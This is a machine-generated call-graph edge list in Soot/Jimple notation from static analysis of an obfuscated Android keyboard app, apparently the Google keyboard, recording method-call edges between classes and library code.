STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r2, "parser") in <lup: void <init>(lwc,java.lang.String)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
STATIC edge: $r6 = staticinvoke <lma: lma v(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)>($r5, $r0, $r1, $r2, $r3) in <iwt: void <clinit>()> ==> <lma: lma v(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r3.<lsm: int a(lsz)>($r2) in <lsn: void q(lsz,java.lang.Object)> ==> <lsm: int a(lsz)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<lkx: lma p()>() in <llg: void <init>(llo)> ==> <lkx: lma p()>
STATIC edge: $r2 = staticinvoke <iwt: java.lang.String c(java.lang.String)>($r2) in <ivv: void e(java.lang.String)> ==> <iwt: java.lang.String c(java.lang.String)>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: staticinvoke <lri: void t(java.lang.Object,int)>($r1, $i1) in <lri: void v(java.lang.Object[],int)> ==> <lri: void t(java.lang.Object,int)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r1, "log site qualifier") in <lta: void <init>(lsr,java.lang.Object)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <hcb: void <init>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean B(java.lang.String)> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke $r5.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <ivv: ivw a()> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $r4 = virtualinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: android.net.Uri insert(android.net.Uri,android.content.ContentValues)>(null, null) in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: android.net.Uri insert(android.net.Uri,android.content.ContentValues)>
STATIC edge: $z0 = staticinvoke <ivw: boolean y(char)>($c5) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean y(char)>
STATIC edge: $i0 = staticinvoke <lma: int e(int)>($i0) in <lly: void j(java.lang.Object)> ==> <lma: int e(int)>
VIRTUAL edge: $r1 = virtualinvoke $r4.<java.lang.String: java.lang.String concat(java.lang.String)>($r1) in <ivv: void g(java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ojg: boolean f(java.lang.Object,java.lang.Object)>($r1, $r4) in <qj: int i(java.lang.Object,int)> ==> <ojg: boolean f(java.lang.Object,java.lang.Object)>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: void clear()>() in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: void clear()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hcb: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r3.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null languageTag") in <hny: void <init>(ivw,java.lang.String)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid country code: %s", $r0, $r6) in <ivw: ivw d(java.util.Locale)> ==> <lsn: void F(java.lang.String,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r6.<ing: void <init>(java.lang.String,iec)>($r2, $r3) in <iej: void g(java.lang.String,iec)> ==> <ing: void <init>(java.lang.String,iec)>
SPECIAL edge: specialinvoke $r0.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, $r1, $r2) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l r(j$.util.concurrent.s)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
STATIC edge: staticinvoke <iwt: void g(char[],int,int)>($r3, $i0, $i1) in <ivv: ivw b(java.lang.String)> ==> <iwt: void g(char[],int,int)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.Class: java.lang.String getName()>() in <miv: void <clinit>()> ==> <java.lang.Class: java.lang.String getName()>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <hcb: void <init>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(5) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke $r0.<miv: void <init>(java.lang.Object)>(null) in <miv: void <clinit>()> ==> <miv: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<java.lang.StringBuilder: void <init>()>() in <ivv: void <init>(byte[])> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: staticinvoke <iwt: void f(char[],int,int)>($r1, 1, $i1) in <iwt: java.lang.String d(java.lang.String)> ==> <iwt: void f(char[],int,int)>
STATIC edge: staticinvoke <idq: idq a(java.lang.String,mag)>("PlaystoreStickerImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
STATIC edge: $r0 = staticinvoke <j$.util.concurrent.r: j$.util.concurrent.s h(j$.util.concurrent.s,j$.util.concurrent.s)>($r0, $r2) in <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)> ==> <j$.util.concurrent.r: j$.util.concurrent.s h(j$.util.concurrent.s,j$.util.concurrent.s)>
SPECIAL edge: specialinvoke r0.<java.lang.ThreadLocal: void <init>()>() in <lwg: void <init>()> ==> <java.lang.ThreadLocal: void <init>()>
SPECIAL edge: specialinvoke $r3.<mag: void <init>(java.lang.String,int,int)>("GIS_GIF_THUMBNAIL", 3, 3) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r1) in <ivv: void g(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: int compareTo(java.lang.Enum)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: $r7 = specialinvoke $r2.<lvr: java.util.Map$Entry c(int)>($i5) in <lvr: void <init>(lvr,lvr)> ==> <lvr: java.util.Map$Entry c(int)>
SPECIAL edge: specialinvoke $r5.<java.lang.ExceptionInInitializerError: void <init>(java.lang.String)>("array index scale not a power of two") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.lang.ExceptionInInitializerError: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: $l0 = staticinvoke <java.lang.System: long currentTimeMillis()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.lang.System: long currentTimeMillis()>
SPECIAL edge: specialinvoke $r1.<java.lang.String: void <init>(char[])>($r0) in <iwt: java.lang.String c(java.lang.String)> ==> <java.lang.String: void <init>(char[])>
CLINIT edge: staticinvoke <bel: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <bel: void <clinit>()>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, null, null) in <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
STATIC edge: $i0 = staticinvoke <kwe: int O(long,long)>($l1, $l2) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <kwe: int O(long,long)>
VIRTUAL edge: $r9 = virtualinvoke $r13.<lvq: java.lang.Object c(int)>($i7) in <lvr: void <init>(lvr,lvr)> ==> <lvq: java.lang.Object c(int)>
VIRTUAL edge: $i2 = virtualinvoke $r0.<java.lang.String: int length()>() in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: int length()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
INTERFACE edge: $r1 = interfaceinvoke $r2.<java.util.Map: java.lang.Object get(java.lang.Object)>($r1) in <ljd: java.lang.Object get(java.lang.Object)> ==> <java.util.LinkedHashMap: java.lang.Object get(java.lang.Object)>
STATIC edge: $r1 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r2, $i1) in <j$.util.concurrent.q: j$.util.concurrent.l c()> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: int length()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r4 = staticinvoke <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])>("cja-XA", "doi-XA", "doi-XD", "doi-XU", "doi-Deva", "doi-Latn", $r0) in <ivw: void <clinit>()> ==> <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getKey()>() in <lid: int hashCode()> ==> <lki: java.lang.Object getKey()>
CLINIT edge: staticinvoke <lvs: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lvs: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l0, $i1, $i2) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, $r1, $r2) in <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r2, $i1, $r3, 0, $i0) in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
SPECIAL edge: $i3 = specialinvoke r0.<qj: int i(java.lang.Object,int)>($r2, $i2) in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <qj: int i(java.lang.Object,int)>
STATIC edge: $r14 = staticinvoke <lkq: lkl e()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <lkq: lkl e()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <lvt: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(16) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
CLINIT edge: staticinvoke <java.lang.Long: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Long: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<lnd: void <init>(java.lang.Object[])>($r1) in <lnd: void <clinit>()> ==> <lnd: void <init>(java.lang.Object[])>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: boolean add(java.lang.Object)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: boolean add(java.lang.Object)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lsp: boolean equals(java.lang.Object)>
CLINIT edge: staticinvoke <iej: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <iej: void <clinit>()>
STATIC edge: $z2 = staticinvoke <lvm: boolean i(char)>($c1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <lvm: boolean i(char)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r0) in <hnc: java.lang.String k(java.lang.String,java.lang.String)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r21.<mag: void <init>(java.lang.String,int,int)>("CURATED_IMAGE", 21, 21) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.b: void <init>(j$.util.concurrent.ConcurrentHashMap)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(8) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $l1 = virtualinvoke $r3.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/ConcurrentHashMap;", "transferIndex") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("invalid tag type: ") in <lvs: lvs a(java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r7 = staticinvoke <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)>("zh-CN", "com.google.android.inputmethod.pinyin", "zh-TW", "com.google.android.apps.inputmethod.zhuyin", "zh-HK", "com.google.android.apps.inputmethod.cantonese", "ko", "com.google.android.inputmethod.korean") in <hnt: void <clinit>()> ==> <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r0, $i1, $r1, $i0, $i2) in <nvw: void k(java.lang.Object[],java.lang.Object[],int,int,int)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
CLINIT edge: staticinvoke <java.lang.Double: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Double: void <clinit>()>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.b: void <init>(j$.util.concurrent.ConcurrentHashMap)>($r1) in <j$.util.concurrent.e: void <init>(j$.util.concurrent.ConcurrentHashMap)> ==> <j$.util.concurrent.b: void <init>(j$.util.concurrent.ConcurrentHashMap)>
SPECIAL edge: specialinvoke $r4.<java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>("segmentShift", $r2) in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>($r1, $i0, 0, $i1) in <j$.util.concurrent.a: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)> ==> <j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>
SPECIAL edge: specialinvoke $r19.<mag: void <init>(java.lang.String,int,int)>("AVATAR_STICKER_CREATE", 19, 19) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<lts: int b()>() in <lsd: boolean b(lsr)> ==> <lsm: int b()>
SPECIAL edge: specialinvoke $r0.<lwg: void <init>()>() in <lwh: void <clinit>()> ==> <lwg: void <init>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <ivw: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r1.<com.google.android.apps.inputmethod.latin.ImeLatinApp: void <init>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <com.google.android.apps.inputmethod.latin.ImeLatinApp: void <init>()>
CLINIT edge: staticinvoke <jvu: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <jvu: void <clinit>()>
SPECIAL edge: specialinvoke $r2.<gbk: void <init>(int)>(18) in <ivw: void <clinit>()> ==> <gbk: void <init>(int)>
INTERFACE edge: $r6 = interfaceinvoke $r3.<java.util.Map: java.lang.Object get(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
CLINIT edge: staticinvoke <lqk: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lqk: void <clinit>()>
SPECIAL edge: specialinvoke $r7.<java.lang.StringBuilder: void <init>()>() in <nzh: boolean f(ivv)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: $r3 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r3, 0) in <lvr: void <init>(java.util.List)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r8.<lup: void <init>(lwc,java.lang.String)>($r9, $r3) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lup: void <init>(lwc,java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <init>()>() in <com.google.android.apps.inputmethod.latin.LatinApp: void <init>()> ==> <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <init>()>
SPECIAL edge: specialinvoke $r1.<java.lang.String: void <init>(char[],int,int)>($r3, $i0, $i1) in <nzh: java.lang.String c()> ==> <java.lang.String: void <init>(char[],int,int)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: void <init>()>() in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: void <init>()>
CLINIT edge: staticinvoke <her: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <her: void <clinit>()>
STATIC edge: staticinvoke <ojg: void d(java.lang.Object,java.lang.String)>($r1, "destination") in <nvw: void k(java.lang.Object[],java.lang.Object[],int,int,int)> ==> <ojg: void d(java.lang.Object,java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.RuntimeException: void <init>()>() in <java.lang.IndexOutOfBoundsException: void <init>()> ==> <java.lang.RuntimeException: void <init>()>
VIRTUAL edge: $r9 = virtualinvoke r0.<lsn: lwc a()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsd: lwc a()>
SPECIAL edge: specialinvoke $r1.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <iej: void <clinit>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke r0.<lsc: java.lang.String e()>() in <lsh: lse h(java.util.logging.Level)> ==> <lsc: java.lang.String e()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkx: java.lang.Object get(java.lang.Object)>($r1) in <lkx: boolean containsKey(java.lang.Object)> ==> <lqk: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<java.lang.Class: java.lang.reflect.Field[] getDeclaredFields()>() in <j$.sun.misc.b: java.lang.reflect.Field i()> ==> <java.lang.Class: java.lang.reflect.Field[] getDeclaredFields()>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r4, $i2, $r8, $i3, $i5) in <lvr: void <init>(lvr,lvr)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
SPECIAL edge: specialinvoke $r29.<mag: void <init>(java.lang.String,int,int)>("TENOR_STATIC_IMAGE", 29, 29) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l3, $i1, $i2) in <j$.util.concurrent.ConcurrentHashMap: void q(int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<ivv: ivw b(java.lang.String)>($r0) in <ivw: ivw f(java.lang.String)> ==> <ivv: ivw b(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<java.util.NoSuchElementException: void <init>()>() in <liz: java.lang.Object next()> ==> <java.util.NoSuchElementException: void <init>()>
SPECIAL edge: specialinvoke $r11.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<java.lang.IndexOutOfBoundsException: void <init>()>() in <lsm: java.lang.Object e(int)> ==> <java.lang.IndexOutOfBoundsException: void <init>()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(6) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r5.<java.lang.AssertionError: void <init>(java.lang.Object)>("Cannot find field:") in <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)> ==> <java.lang.AssertionError: void <init>(java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r1.<j$.util.concurrent.q: j$.util.concurrent.l c()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.q: j$.util.concurrent.l c()>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <ltr: java.lang.Object d(lsz)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorTrendingMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(8) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(8) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: specialinvoke $r2.<java.util.AbstractMap$SimpleImmutableEntry: void <init>(java.lang.Object,java.lang.Object)>($r1, $r3) in <lvr: java.util.Map$Entry d(java.lang.String,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: void <init>(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(0) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
STATIC edge: $r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(9) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $i0 = virtualinvoke $r6.<java.lang.Enum: int ordinal()>() in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <java.lang.Enum: int ordinal()>
INTERFACE edge: $r9 = interfaceinvoke $r7.<java.util.Map$Entry: java.lang.Object getValue()>() in <lvr: void <init>(lvr,lvr)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
STATIC edge: staticinvoke <java.util.Collections: void sort(java.util.List)>($r3) in <ivv: ivw a()> ==> <java.util.Collections: void sort(java.util.List)>
STATIC edge: staticinvoke <lvm: void h(boolean,java.lang.String)>($z0, "injected class name is empty") in <lsh: lsh j(java.lang.String)> ==> <lvm: void h(boolean,java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <ivw: boolean equals(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r7) in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
CLINIT edge: staticinvoke <lsn: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lsn: void <clinit>()>
VIRTUAL edge: $r1 = virtualinvoke r0.<liz: java.lang.Object a(int)>($i0) in <liz: java.lang.Object next()> ==> <liw: java.lang.Object a(int)>
SPECIAL edge: $i0 = specialinvoke r0.<ivv: int h()>() in <ivv: ivw a()> ==> <ivv: int h()>
SPECIAL edge: specialinvoke r0.<lsd: void <init>(java.util.logging.Level)>($r2) in <lsf: void <init>(lsh,java.util.logging.Level)> ==> <lsd: void <init>(java.util.logging.Level)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.lang.String: int hashCode()>
SPECIAL edge: specialinvoke r0.<lts: void <init>()>() in <ltr: void <init>()> ==> <lts: void <init>()>
STATIC edge: $r6 = staticinvoke <ivw: ivw f(java.lang.String)>("zz") in <hnt: void <clinit>()> ==> <ivw: ivw f(java.lang.String)>
VIRTUAL edge: $r10 = virtualinvoke $r10.<java.lang.Throwable: java.lang.Throwable getCause()>() in <luk: lum a(java.lang.String[])> ==> <java.lang.Throwable: java.lang.Throwable getCause()>
SPECIAL edge: specialinvoke r0.<lsq: void <init>()>() in <lsp: void <init>(java.lang.String,java.lang.String,int,java.lang.String)> ==> <lsq: void <init>()>
STATIC edge: $r17 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>($z0) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>
VIRTUAL edge: $r17 = virtualinvoke $r15.<java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>($r16) in <lvm: lum j()> ==> <java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>
SPECIAL edge: specialinvoke $r0.<lqk: void <init>()>() in <lqk: void <clinit>()> ==> <lqk: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r0.<java.lang.String: char[] toCharArray()>() in <iwt: char[] s(java.lang.String,char,char,int)> ==> <java.lang.String: char[] toCharArray()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
VIRTUAL edge: $r5 = virtualinvoke r0.<lsn: lsw i(lsq)>($r4) in <lsn: lsw j(java.lang.String,java.lang.String,int,java.lang.String)> ==> <lsn: lsw i(lsq)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(3) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
